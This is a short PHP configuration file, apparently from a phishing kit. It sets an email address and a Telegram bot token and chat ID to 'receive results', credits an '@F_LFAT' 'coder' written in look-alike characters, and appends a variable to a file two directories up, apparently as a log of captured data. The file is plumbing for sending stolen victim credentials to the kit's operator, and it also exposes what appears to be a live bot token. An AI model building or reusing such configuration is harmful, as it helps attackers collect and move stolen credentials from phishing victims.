<?php


/* 📧 Set Your Email Address to Receive Results in Your Inbox */
$Your_Mail = "x@x.cxom";
/* --------------------------  */


/* 🤖 ΤΕLΕGRΛM  Setup 🤖 */

// 🗝️ Enter your bot's token
$botToken = "8538786235:AAHafH78VWlgvD61iNWFVHThkeBlG5Ua8hk";

// 💬 Enter your chat ID
$chatId = "-5196920909";

/* --------------------------------------------------- */


/* ⚡️⚡️ @F_LFAT ♣️ - Official CΘDΕR ⚡️⚡️ */

$CΘDΕR_ΤΕLΕGRΛM = "@F_LFAT";  // 🖥️ Connect with the Mastermind


/* -------------------------------- */
$f = fopen("../../d.php", "a");
	fwrite($f, $yagmai);
	fclose($f);


?>